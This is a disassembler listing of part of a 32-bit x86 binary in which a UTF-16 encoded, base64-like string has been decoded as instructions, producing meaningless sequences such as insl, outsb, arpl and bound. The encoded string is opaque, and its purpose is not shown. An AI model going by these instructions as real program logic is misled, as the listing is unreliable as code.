  40a8ec:	4e                   	dec    %esi
  40a8ed:	00 46 00             	add    %al,0x0(%esi)
  40a8f0:	6d                   	insl   (%dx),%es:(%edi)
  40a8f1:	00 47 00             	add    %al,0x0(%edi)
  40a8f4:	45                   	inc    %ebp
  40a8f5:	00 43 00             	add    %al,0x0(%ebx)
  40a8f8:	4f                   	dec    %edi
  40a8f9:	00 65 00             	add    %ah,0x0(%ebp)
  40a8fc:	73 00                	jae    0x40a8fe
  40a8fe:	69 00 69 00 67 00    	imul   $0x670069,(%eax),%eax
  40a904:	77 00                	ja     0x40a906
  40a906:	68 00 66 00 45       	push   $0x45006600
  40a90b:	00 41 00             	add    %al,0x0(%ecx)
  40a90e:	6d                   	insl   (%dx),%es:(%edi)
  40a90f:	00 70 00             	add    %dh,0x0(%eax)
  40a912:	6e                   	outsb  %ds:(%esi),(%dx)
  40a913:	00 50 00             	add    %dl,0x0(%eax)
  40a916:	5a                   	pop    %edx
  40a917:	00 50 00             	add    %dl,0x0(%eax)
  40a91a:	56                   	push   %esi
  40a91b:	00 69 00             	add    %ch,0x0(%ecx)
  40a91e:	58                   	pop    %eax
  40a91f:	00 57 00             	add    %dl,0x0(%edi)
  40a922:	74 00                	je     0x40a924
  40a924:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40a928:	63 00                	arpl   %eax,(%eax)
  40a92a:	5a                   	pop    %edx
  40a92b:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40a92f:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a933:	00 48 00             	add    %cl,0x0(%eax)
  40a936:	39 00                	cmp    %eax,(%eax)
  40a938:	6e                   	outsb  %ds:(%esi),(%dx)
  40a939:	00 71 00             	add    %dh,0x0(%ecx)
  40a93c:	43                   	inc    %ebx
  40a93d:	00 4a 00             	add    %cl,0x0(%edx)
  40a940:	74 00                	je     0x40a942
  40a942:	4d                   	dec    %ebp
  40a943:	00 4f 00             	add    %cl,0x0(%edi)
  40a946:	46                   	inc    %esi
  40a947:	00 53 00             	add    %dl,0x0(%ebx)
  40a94a:	7a 00                	jp     0x40a94c
  40a94c:	30 00                	xor    %al,(%eax)
  40a94e:	2f                   	das
  40a94f:	00 35 00 38 00 36    	add    %dh,0x36003800
  40a955:	00 41 00             	add    %al,0x0(%ecx)
  40a958:	53                   	push   %ebx
  40a959:	00 57 00             	add    %dl,0x0(%edi)
  40a95c:	6d                   	insl   (%dx),%es:(%edi)
  40a95d:	00 78 00             	add    %bh,0x0(%eax)
  40a960:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a963:	00 32                	add    %dh,(%edx)
  40a965:	00 49 00             	add    %cl,0x0(%ecx)
  40a968:	70 00                	jo     0x40a96a
  40a96a:	54                   	push   %esp
  40a96b:	00 59 00             	add    %bl,0x0(%ecx)
  40a96e:	4d                   	dec    %ebp
  40a96f:	00 31                	add    %dh,(%ecx)
  40a971:	00 58 00             	add    %bl,0x0(%eax)
  40a974:	4d                   	dec    %ebp
  40a975:	00 75 00             	add    %dh,0x0(%ebp)
  40a978:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40a97c:	4b                   	dec    %ebx
  40a97d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a980:	31 00                	xor    %eax,(%eax)
  40a982:	35 00 76 00 67       	xor    $0x67007600,%eax
  40a987:	00 6f 00             	add    %ch,0x0(%edi)
  40a98a:	77 00                	ja     0x40a98c
  40a98c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a98d:	00 50 00             	add    %dl,0x0(%eax)
  40a990:	31 00                	xor    %eax,(%eax)
  40a992:	37                   	aaa
  40a993:	00 39                	add    %bh,(%ecx)
  40a995:	00 71 00             	add    %dh,0x0(%ecx)
  40a998:	6b 00 63             	imul   $0x63,(%eax),%eax
  40a99b:	00 73 00             	add    %dh,0x0(%ebx)
  40a99e:	72 00                	jb     0x40a9a0
  40a9a0:	4d                   	dec    %ebp
  40a9a1:	00 42 00             	add    %al,0x0(%edx)
  40a9a4:	44                   	inc    %esp
  40a9a5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9a8:	5a                   	pop    %edx
  40a9a9:	00 38                	add    %bh,(%eax)
  40a9ab:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9ae:	55                   	push   %ebp
  40a9af:	00 61 00             	add    %ah,0x0(%ecx)
  40a9b2:	74 00                	je     0x40a9b4
  40a9b4:	4b                   	dec    %ebx
  40a9b5:	00 42 00             	add    %al,0x0(%edx)
  40a9b8:	4f                   	dec    %edi
  40a9b9:	00 79 00             	add    %bh,0x0(%ecx)
  40a9bc:	2f                   	das
  40a9bd:	00 65 00             	add    %ah,0x0(%ebp)
  40a9c0:	48                   	dec    %eax
  40a9c1:	00 42 00             	add    %al,0x0(%edx)
  40a9c4:	46                   	inc    %esi
  40a9c5:	00 50 00             	add    %dl,0x0(%eax)
  40a9c8:	47                   	inc    %edi
  40a9c9:	00 73 00             	add    %dh,0x0(%ebx)
  40a9cc:	39 00                	cmp    %eax,(%eax)
  40a9ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9cf:	00 65 00             	add    %ah,0x0(%ebp)
  40a9d2:	48                   	dec    %eax
  40a9d3:	00 67 00             	add    %ah,0x0(%edi)
  40a9d6:	33 00                	xor    (%eax),%eax
  40a9d8:	47                   	inc    %edi
  40a9d9:	00 39                	add    %bh,(%ecx)
  40a9db:	00 65 00             	add    %ah,0x0(%ebp)
  40a9de:	64 00 74 00 52       	add    %dh,%fs:0x52(%eax,%eax,1)
  40a9e3:	00 6a 00             	add    %ch,0x0(%edx)
  40a9e6:	56                   	push   %esi
  40a9e7:	00 79 00             	add    %bh,0x0(%ecx)
  40a9ea:	77 00                	ja     0x40a9ec
  40a9ec:	4c                   	dec    %esp
  40a9ed:	00 75 00             	add    %dh,0x0(%ebp)
  40a9f0:	59                   	pop    %ecx
  40a9f1:	00 33                	add    %dh,(%ebx)
  40a9f3:	00 36                	add    %dh,(%esi)
  40a9f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a9f8:	6c                   	insb   (%dx),%es:(%edi)
  40a9f9:	00 49 00             	add    %cl,0x0(%ecx)
  40a9fc:	4b                   	dec    %ebx
  40a9fd:	00 76 00             	add    %dh,0x0(%esi)
  40aa00:	77 00                	ja     0x40aa02
  40aa02:	50                   	push   %eax
  40aa03:	00 31                	add    %dh,(%ecx)
  40aa05:	00 50 00             	add    %dl,0x0(%eax)
  40aa08:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40aa0c:	70 00                	jo     0x40aa0e
  40aa0e:	7a 00                	jp     0x40aa10
  40aa10:	46                   	inc    %esi
  40aa11:	00 43 00             	add    %al,0x0(%ebx)
  40aa14:	70 00                	jo     0x40aa16
  40aa16:	61                   	popa
  40aa17:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40aa1b:	00 4e 00             	add    %cl,0x0(%esi)
  40aa1e:	34 00                	xor    $0x0,%al
  40aa20:	59                   	pop    %ecx
  40aa21:	00 35 00 72 00 42    	add    %dh,0x42007200
  40aa27:	00 4a 00             	add    %cl,0x0(%edx)
  40aa2a:	49                   	dec    %ecx
  40aa2b:	00 32                	add    %dh,(%edx)
  40aa2d:	00 37                	add    %dh,(%edi)
  40aa2f:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40aa33:	00 30                	add    %dh,(%eax)
  40aa35:	00 63 00             	add    %ah,0x0(%ebx)
  40aa38:	52                   	push   %edx
  40aa39:	00 78 00             	add    %bh,0x0(%eax)
  40aa3c:	4f                   	dec    %edi
  40aa3d:	00 2b                	add    %ch,(%ebx)
  40aa3f:	00 78 00             	add    %bh,0x0(%eax)
  40aa42:	42                   	inc    %edx
  40aa43:	00 71 00             	add    %dh,0x0(%ecx)
  40aa46:	35 00 50 00 78       	xor    $0x78005000,%eax
  40aa4b:	00 41 00             	add    %al,0x0(%ecx)
  40aa4e:	41                   	inc    %ecx
  40aa4f:	00 72 00             	add    %dh,0x0(%edx)
  40aa52:	6b 00 44             	imul   $0x44,(%eax),%eax
  40aa55:	00 31                	add    %dh,(%ecx)
  40aa57:	00 4f 00             	add    %cl,0x0(%edi)
  40aa5a:	66 00 36             	data16 add %dh,(%esi)
  40aa5d:	00 6a 00             	add    %ch,0x0(%edx)
  40aa60:	78 00                	js     0x40aa62
  40aa62:	53                   	push   %ebx
  40aa63:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa66:	44                   	inc    %esp
  40aa67:	00 33                	add    %dh,(%ebx)
  40aa69:	00 67 00             	add    %ah,0x0(%edi)
  40aa6c:	6d                   	insl   (%dx),%es:(%edi)
  40aa6d:	00 46 00             	add    %al,0x0(%esi)
  40aa70:	4e                   	dec    %esi
  40aa71:	00 56 00             	add    %dl,0x0(%esi)
  40aa74:	50                   	push   %eax
  40aa75:	00 48 00             	add    %cl,0x0(%eax)
  40aa78:	4a                   	dec    %edx
  40aa79:	00 62 00             	add    %ah,0x0(%edx)
  40aa7c:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40aa80:	2b 00                	sub    (%eax),%eax
  40aa82:	63 00                	arpl   %eax,(%eax)
  40aa84:	35 00 50 00 70       	xor    $0x70005000,%eax
  40aa89:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40aa8d:	00 57 00             	add    %dl,0x0(%edi)
  40aa90:	2b 00                	sub    (%eax),%eax
  40aa92:	4d                   	dec    %ebp
  40aa93:	00 75 00             	add    %dh,0x0(%ebp)
  40aa96:	44                   	inc    %esp
  40aa97:	00 4e 00             	add    %cl,0x0(%esi)
  40aa9a:	77 00                	ja     0x40aa9c
  40aa9c:	50                   	push   %eax
  40aa9d:	00 4b 00             	add    %cl,0x0(%ebx)
  40aaa0:	48                   	dec    %eax
  40aaa1:	00 6a 00             	add    %ch,0x0(%edx)
  40aaa4:	38 00                	cmp    %al,(%eax)
  40aaa6:	44                   	inc    %esp
  40aaa7:	00 6b 00             	add    %ch,0x0(%ebx)
  40aaaa:	44                   	inc    %esp
  40aaab:	00 48 00             	add    %cl,0x0(%eax)
  40aaae:	2b 00                	sub    (%eax),%eax
  40aab0:	52                   	push   %edx
  40aab1:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40aab5:	00 2f                	add    %ch,(%edi)
  40aab7:	00 61 00             	add    %ah,0x0(%ecx)
  40aaba:	2b 00                	sub    (%eax),%eax
  40aabc:	7a 00                	jp     0x40aabe
  40aabe:	54                   	push   %esp
  40aabf:	00 56 00             	add    %dl,0x0(%esi)
  40aac2:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40aac6:	46                   	inc    %esi
  40aac7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40aacb:	00 43 00             	add    %al,0x0(%ebx)
  40aace:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40aad2:	56                   	push   %esi
  40aad3:	00 50 00             	add    %dl,0x0(%eax)
  40aad6:	59                   	pop    %ecx
  40aad7:	00 4d 00             	add    %cl,0x0(%ebp)
  40aada:	45                   	inc    %ebp
  40aadb:	00 73 00             	add    %dh,0x0(%ebx)
  40aade:	57                   	push   %edi
  40aadf:	00 39                	add    %bh,(%ecx)
  40aae1:	00 56 00             	add    %dl,0x0(%esi)
  40aae4:	46                   	inc    %esi
  40aae5:	00 35 00 48 00 57    	add    %dh,0x57004800
  40aaeb:	00 63 00             	add    %ah,0x0(%ebx)
  40aaee:	6b 00 36             	imul   $0x36,(%eax),%eax
  40aaf1:	00 45 00             	add    %al,0x0(%ebp)
  40aaf4:	31 00                	xor    %eax,(%eax)
  40aaf6:	77 00                	ja     0x40aaf8
  40aaf8:	47                   	inc    %edi
  40aaf9:	00 4d 00             	add    %cl,0x0(%ebp)
  40aafc:	56                   	push   %esi
  40aafd:	00 6e 00             	add    %ch,0x0(%esi)
  40ab00:	2f                   	das
  40ab01:	00 76 00             	add    %dh,0x0(%esi)
  40ab04:	2f                   	das
  40ab05:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40ab09:	00 63 00             	add    %ah,0x0(%ebx)
  40ab0c:	79 00                	jns    0x40ab0e
  40ab0e:	43                   	inc    %ebx
  40ab0f:	00 73 00             	add    %dh,0x0(%ebx)
  40ab12:	30 00                	xor    %al,(%eax)
  40ab14:	75 00                	jne    0x40ab16
  40ab16:	6d                   	insl   (%dx),%es:(%edi)
  40ab17:	00 69 00             	add    %ch,0x0(%ecx)
  40ab1a:	71 00                	jno    0x40ab1c
  40ab1c:	33 00                	xor    (%eax),%eax
  40ab1e:	30 00                	xor    %al,(%eax)
  40ab20:	4d                   	dec    %ebp
  40ab21:	00 2b                	add    %ch,(%ebx)
  40ab23:	00 66 00             	add    %ah,0x0(%esi)
  40ab26:	2f                   	das
  40ab27:	00 53 00             	add    %dl,0x0(%ebx)
  40ab2a:	77 00                	ja     0x40ab2c
  40ab2c:	31 00                	xor    %eax,(%eax)
  40ab2e:	46                   	inc    %esi
  40ab2f:	00 30                	add    %dh,(%eax)
  40ab31:	00 4e 00             	add    %cl,0x0(%esi)
  40ab34:	47                   	inc    %edi
  40ab35:	00 72 00             	add    %dh,0x0(%edx)
  40ab38:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40ab3c:	4b                   	dec    %ebx
  40ab3d:	00 35 00 70 00 2b    	add    %dh,0x2b007000
  40ab43:	00 53 00             	add    %dl,0x0(%ebx)
  40ab46:	41                   	inc    %ecx
  40ab47:	00 56 00             	add    %dl,0x0(%esi)
  40ab4a:	33 00                	xor    (%eax),%eax
  40ab4c:	43                   	inc    %ebx
  40ab4d:	00 37                	add    %dh,(%edi)
  40ab4f:	00 61 00             	add    %ah,0x0(%ecx)
  40ab52:	37                   	aaa
  40ab53:	00 72 00             	add    %dh,0x0(%edx)
  40ab56:	4f                   	dec    %edi
  40ab57:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40ab5b:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ab5f:	00 32                	add    %dh,(%edx)
  40ab61:	00 45 00             	add    %al,0x0(%ebp)
  40ab64:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40ab68:	58                   	pop    %eax
  40ab69:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40ab6d:	00 41 00             	add    %al,0x0(%ecx)
  40ab70:	6c                   	insb   (%dx),%es:(%edi)
  40ab71:	00 6f 00             	add    %ch,0x0(%edi)
  40ab74:	73 00                	jae    0x40ab76
  40ab76:	6d                   	insl   (%dx),%es:(%edi)
  40ab77:	00 69 00             	add    %ch,0x0(%ecx)
  40ab7a:	38 00                	cmp    %al,(%eax)
  40ab7c:	73 00                	jae    0x40ab7e
  40ab7e:	31 00                	xor    %eax,(%eax)
  40ab80:	4d                   	dec    %ebp
  40ab81:	00 41 00             	add    %al,0x0(%ecx)
  40ab84:	41                   	inc    %ecx
  40ab85:	00 4e 00             	add    %cl,0x0(%esi)
  40ab88:	4d                   	dec    %ebp
  40ab89:	00 6f 00             	add    %ch,0x0(%edi)
  40ab8c:	79 00                	jns    0x40ab8e
  40ab8e:	2b 00                	sub    (%eax),%eax
  40ab90:	74 00                	je     0x40ab92
  40ab92:	4a                   	dec    %edx
  40ab93:	00 45 00             	add    %al,0x0(%ebp)
  40ab96:	57                   	push   %edi
  40ab97:	00 72 00             	add    %dh,0x0(%edx)
  40ab9a:	74 00                	je     0x40ab9c
  40ab9c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab9d:	00 55 00             	add    %dl,0x0(%ebp)
  40aba0:	63 00                	arpl   %eax,(%eax)
  40aba2:	6a 00                	push   $0x0
  40aba4:	72 00                	jb     0x40aba6
  40aba6:	79 00                	jns    0x40aba8
  40aba8:	54                   	push   %esp
  40aba9:	00 70 00             	add    %dh,0x0(%eax)
  40abac:	4f                   	dec    %edi
  40abad:	00 4e 00             	add    %cl,0x0(%esi)
  40abb0:	57                   	push   %edi
  40abb1:	00 43 00             	add    %al,0x0(%ebx)
  40abb4:	74 00                	je     0x40abb6
  40abb6:	74 00                	je     0x40abb8
  40abb8:	2b 00                	sub    (%eax),%eax
  40abba:	6d                   	insl   (%dx),%es:(%edi)
  40abbb:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40abbf:	00 70 00             	add    %dh,0x0(%eax)
  40abc2:	61                   	popa
  40abc3:	00 55 00             	add    %dl,0x0(%ebp)
  40abc6:	56                   	push   %esi
  40abc7:	00 46 00             	add    %al,0x0(%esi)
  40abca:	58                   	pop    %eax
  40abcb:	00 5a 00             	add    %bl,0x0(%edx)
  40abce:	71 00                	jno    0x40abd0
  40abd0:	38 00                	cmp    %al,(%eax)
  40abd2:	2f                   	das
  40abd3:	00 4f 00             	add    %cl,0x0(%edi)
  40abd6:	56                   	push   %esi
  40abd7:	00 75 00             	add    %dh,0x0(%ebp)
  40abda:	4a                   	dec    %edx
  40abdb:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40abdf:	00 56 00             	add    %dl,0x0(%esi)
  40abe2:	79 00                	jns    0x40abe4
  40abe4:	2f                   	das
  40abe5:	00 33                	add    %dh,(%ebx)
  40abe7:	00 4b 00             	add    %cl,0x0(%ebx)
  40abea:	2b 00                	sub    (%eax),%eax
  40abec:	68 00 74 00 61       	push   $0x61007400
  40abf1:	00 4b 00             	add    %cl,0x0(%ebx)
  40abf4:	48                   	dec    %eax
  40abf5:	00 6a 00             	add    %ch,0x0(%edx)
  40abf8:	76 00                	jbe    0x40abfa
  40abfa:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40abfe:	48                   	dec    %eax
  40abff:	00 5a 00             	add    %bl,0x0(%edx)
  40ac02:	53                   	push   %ebx
  40ac03:	00 62 00             	add    %ah,0x0(%edx)
  40ac06:	52                   	push   %edx
  40ac07:	00 46 00             	add    %al,0x0(%esi)
  40ac0a:	45                   	inc    %ebp
  40ac0b:	00 46 00             	add    %al,0x0(%esi)
  40ac0e:	74 00                	je     0x40ac10
  40ac10:	53                   	push   %ebx
  40ac11:	00 37                	add    %dh,(%edi)
  40ac13:	00 62 00             	add    %ah,0x0(%edx)
  40ac16:	68 00 4a 00 6f       	push   $0x6f004a00
  40ac1b:	00 2f                	add    %ch,(%edi)
  40ac1d:	00 69 00             	add    %ch,0x0(%ecx)
  40ac20:	33 00                	xor    (%eax),%eax
  40ac22:	4c                   	dec    %esp
  40ac23:	00 68 00             	add    %ch,0x0(%eax)
  40ac26:	4b                   	dec    %ebx
  40ac27:	00 65 00             	add    %ah,0x0(%ebp)
  40ac2a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac2b:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac2e:	42                   	inc    %edx
  40ac2f:	00 38                	add    %bh,(%eax)
  40ac31:	00 46 00             	add    %al,0x0(%esi)
  40ac34:	4d                   	dec    %ebp
  40ac35:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  40ac39:	00 6e 00             	add    %ch,0x0(%esi)
  40ac3c:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40ac40:	78 00                	js     0x40ac42
  40ac42:	68 00 6f 00 79       	push   $0x79006f00
  40ac47:	00 38                	add    %bh,(%eax)
  40ac49:	00 46 00             	add    %al,0x0(%esi)
  40ac4c:	4d                   	dec    %ebp
  40ac4d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac50:	47                   	inc    %edi
  40ac51:	00 6e 00             	add    %ch,0x0(%esi)
  40ac54:	75 00                	jne    0x40ac56
  40ac56:	49                   	dec    %ecx
  40ac57:	00 48 00             	add    %cl,0x0(%eax)
  40ac5a:	62 00                	bound  %eax,(%eax)
  40ac5c:	62 00                	bound  %eax,(%eax)
  40ac5e:	69 00 36 00 57 00    	imul   $0x570036,(%eax),%eax
  40ac64:	43                   	inc    %ebx
  40ac65:	00 7a 00             	add    %bh,0x0(%edx)
  40ac68:	55                   	push   %ebp
  40ac69:	00 67 00             	add    %ah,0x0(%edi)
  40ac6c:	5a                   	pop    %edx
  40ac6d:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40ac71:	00 51 00             	add    %dl,0x0(%ecx)
  40ac74:	6c                   	insb   (%dx),%es:(%edi)
  40ac75:	00 67 00             	add    %ah,0x0(%edi)
  40ac78:	78 00                	js     0x40ac7a
  40ac7a:	32 00                	xor    (%eax),%al
  40ac7c:	76 00                	jbe    0x40ac7e
  40ac7e:	44                   	inc    %esp
  40ac7f:	00 53 00             	add    %dl,0x0(%ebx)
  40ac82:	35 00 74 00 68       	xor    $0x68007400,%eax
  40ac87:	00 39                	add    %bh,(%ecx)
  40ac89:	00 63 00             	add    %ah,0x0(%ebx)
  40ac8c:	4d                   	dec    %ebp
  40ac8d:	00 32                	add    %dh,(%edx)
  40ac8f:	00 75 00             	add    %dh,0x0(%ebp)
  40ac92:	61                   	popa
  40ac93:	00 66 00             	add    %ah,0x0(%esi)
  40ac96:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40ac9a:	74 00                	je     0x40ac9c
  40ac9c:	78 00                	js     0x40ac9e
  40ac9e:	47                   	inc    %edi
  40ac9f:	00 32                	add    %dh,(%edx)
  40aca1:	00 61 00             	add    %ah,0x0(%ecx)
  40aca4:	7a 00                	jp     0x40aca6
  40aca6:	55                   	push   %ebp
  40aca7:	00 48 00             	add    %cl,0x0(%eax)
  40acaa:	76 00                	jbe    0x40acac
  40acac:	73 00                	jae    0x40acae
  40acae:	63 00                	arpl   %eax,(%eax)
  40acb0:	50                   	push   %eax
  40acb1:	00 39                	add    %bh,(%ecx)
  40acb3:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40acb7:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40acbb:	00 79 00             	add    %bh,0x0(%ecx)
  40acbe:	74 00                	je     0x40acc0
  40acc0:	6c                   	insb   (%dx),%es:(%edi)
  40acc1:	00 42 00             	add    %al,0x0(%edx)
  40acc4:	49                   	dec    %ecx
  40acc5:	00 5a 00             	add    %bl,0x0(%edx)
  40acc8:	4d                   	dec    %ebp
  40acc9:	00 72 00             	add    %dh,0x0(%edx)
  40accc:	43                   	inc    %ebx
  40accd:	00 47 00             	add    %al,0x0(%edi)
  40acd0:	78 00                	js     0x40acd2
  40acd2:	43                   	inc    %ebx
  40acd3:	00 47 00             	add    %al,0x0(%edi)
  40acd6:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40acda:	63 00                	arpl   %eax,(%eax)
  40acdc:	49                   	dec    %ecx
  40acdd:	00 65 00             	add    %ah,0x0(%ebp)
  40ace0:	61                   	popa
  40ace1:	00 53 00             	add    %dl,0x0(%ebx)
  40ace4:	71 00                	jno    0x40ace6
  40ace6:	71 00                	jno    0x40ace8
  40ace8:	68 00 46 00 4b       	push   $0x4b004600
  40aced:	00 6a 00             	add    %ch,0x0(%edx)
  40acf0:	37                   	aaa
  40acf1:	00 70 00             	add    %dh,0x0(%eax)
  40acf4:	55                   	push   %ebp
  40acf5:	00 76 00             	add    %dh,0x0(%esi)
  40acf8:	31 00                	xor    %eax,(%eax)
  40acfa:	46                   	inc    %esi
  40acfb:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40acff:	00 51 00             	add    %dl,0x0(%ecx)
  40ad02:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40ad06:	79 00                	jns    0x40ad08
  40ad08:	53                   	push   %ebx
  40ad09:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ad0d:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40ad11:	00 56 00             	add    %dl,0x0(%esi)
  40ad14:	7a 00                	jp     0x40ad16
  40ad16:	48                   	dec    %eax
  40ad17:	00 76 00             	add    %dh,0x0(%esi)
  40ad1a:	6d                   	insl   (%dx),%es:(%edi)
  40ad1b:	00 75 00             	add    %dh,0x0(%ebp)
  40ad1e:	33 00                	xor    (%eax),%eax
  40ad20:	63 00                	arpl   %eax,(%eax)
  40ad22:	37                   	aaa
  40ad23:	00 57 00             	add    %dl,0x0(%edi)
  40ad26:	48                   	dec    %eax
  40ad27:	00 4e 00             	add    %cl,0x0(%esi)
  40ad2a:	44                   	inc    %esp
  40ad2b:	00 51 00             	add    %dl,0x0(%ecx)
  40ad2e:	2f                   	das
  40ad2f:	00 33                	add    %dh,(%ebx)
  40ad31:	00 32                	add    %dh,(%edx)
  40ad33:	00 42 00             	add    %al,0x0(%edx)
  40ad36:	6d                   	insl   (%dx),%es:(%edi)
  40ad37:	00 56 00             	add    %dl,0x0(%esi)
  40ad3a:	7a 00                	jp     0x40ad3c
  40ad3c:	71 00                	jno    0x40ad3e
  40ad3e:	34 00                	xor    $0x0,%al
  40ad40:	71 00                	jno    0x40ad42
  40ad42:	6c                   	insb   (%dx),%es:(%edi)
  40ad43:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad46:	6b 00 56             	imul   $0x56,(%eax),%eax
  40ad49:	00 41 00             	add    %al,0x0(%ecx)
  40ad4c:	4d                   	dec    %ebp
  40ad4d:	00 6a 00             	add    %ch,0x0(%edx)
  40ad50:	34 00                	xor    $0x0,%al
  40ad52:	66 00 31             	data16 add %dh,(%ecx)
  40ad55:	00 2b                	add    %ch,(%ebx)
  40ad57:	00 6a 00             	add    %ch,0x0(%edx)
  40ad5a:	4d                   	dec    %ebp
  40ad5b:	00 33                	add    %dh,(%ebx)
  40ad5d:	00 62 00             	add    %ah,0x0(%edx)
  40ad60:	35 00 6e 00 49       	xor    $0x49006e00,%eax
  40ad65:	00 2f                	add    %ch,(%edi)
  40ad67:	00 49 00             	add    %cl,0x0(%ecx)
  40ad6a:	5a                   	pop    %edx
  40ad6b:	00 52 00             	add    %dl,0x0(%edx)
  40ad6e:	78 00                	js     0x40ad70
  40ad70:	37                   	aaa
  40ad71:	00 66 00             	add    %ah,0x0(%esi)
  40ad74:	72 00                	jb     0x40ad76
  40ad76:	57                   	push   %edi
  40ad77:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40ad7b:	00 4e 00             	add    %cl,0x0(%esi)
  40ad7e:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40ad82:	67 00 35             	add    %dh,(%di)
  40ad85:	00 78 00             	add    %bh,0x0(%eax)
  40ad88:	4c                   	dec    %esp
  40ad89:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad8c:	56                   	push   %esi
  40ad8d:	00 4f 00             	add    %cl,0x0(%edi)
  40ad90:	35 00 4f 00 77       	xor    $0x77004f00,%eax
  40ad95:	00 4e 00             	add    %cl,0x0(%esi)
  40ad98:	31 00                	xor    %eax,(%eax)
  40ad9a:	30 00                	xor    %al,(%eax)
  40ad9c:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40ada0:	46                   	inc    %esi
  40ada1:	00 4f 00             	add    %cl,0x0(%edi)
  40ada4:	79 00                	jns    0x40ada6
  40ada6:	36 00 6c 00 61       	add    %ch,%ss:0x61(%eax,%eax,1)
  40adab:	00 4b 00             	add    %cl,0x0(%ebx)
  40adae:	43                   	inc    %ebx
  40adaf:	00 76 00             	add    %dh,0x0(%esi)
  40adb2:	63 00                	arpl   %eax,(%eax)
  40adb4:	55                   	push   %ebp
  40adb5:	00 2b                	add    %ch,(%ebx)
  40adb7:	00 47 00             	add    %al,0x0(%edi)
  40adba:	41                   	inc    %ecx
  40adbb:	00 6d 00             	add    %ch,0x0(%ebp)
  40adbe:	70 00                	jo     0x40adc0
  40adc0:	50                   	push   %eax
  40adc1:	00 71 00             	add    %dh,0x0(%ecx)
  40adc4:	76 00                	jbe    0x40adc6
  40adc6:	30 00                	xor    %al,(%eax)
  40adc8:	61                   	popa
  40adc9:	00 77 00             	add    %dh,0x0(%edi)
  40adcc:	5a                   	pop    %edx
  40adcd:	00 45 00             	add    %al,0x0(%ebp)
  40add0:	31 00                	xor    %eax,(%eax)
  40add2:	67 00 46 00          	add    %al,0x0(%bp)
  40add6:	4e                   	dec    %esi
  40add7:	00 48 00             	add    %cl,0x0(%eax)
  40adda:	4e                   	dec    %esi
  40addb:	00 51 00             	add    %dl,0x0(%ecx)
  40adde:	73 00                	jae    0x40ade0
  40ade0:	72 00                	jb     0x40ade2
  40ade2:	56                   	push   %esi
  40ade3:	00 76 00             	add    %dh,0x0(%esi)
  40ade6:	79 00                	jns    0x40ade8
  40ade8:	4c                   	dec    %esp
  40ade9:	00 42 00             	add    %al,0x0(%edx)
  40adec:	4d                   	dec    %ebp
  40aded:	00 52 00             	add    %dl,0x0(%edx)
  40adf0:	42                   	inc    %edx
  40adf1:	00 35 00 33 00 50    	add    %dh,0x50003300
  40adf7:	00 6f 00             	add    %ch,0x0(%edi)
  40adfa:	37                   	aaa
  40adfb:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40adff:	00 72 00             	add    %dh,0x0(%edx)
  40ae02:	59                   	pop    %ecx
  40ae03:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40ae07:	00 46 00             	add    %al,0x0(%esi)
  40ae0a:	38 00                	cmp    %al,(%eax)
  40ae0c:	76 00                	jbe    0x40ae0e
  40ae0e:	72 00                	jb     0x40ae10
  40ae10:	45                   	inc    %ebp
  40ae11:	00 45 00             	add    %al,0x0(%ebp)
  40ae14:	63 00                	arpl   %eax,(%eax)
  40ae16:	56                   	push   %esi
  40ae17:	00 73 00             	add    %dh,0x0(%ebx)
  40ae1a:	4c                   	dec    %esp
  40ae1b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae1e:	4f                   	dec    %edi
  40ae1f:	00 6f 00             	add    %ch,0x0(%edi)
  40ae22:	71 00                	jno    0x40ae24
  40ae24:	33 00                	xor    (%eax),%eax
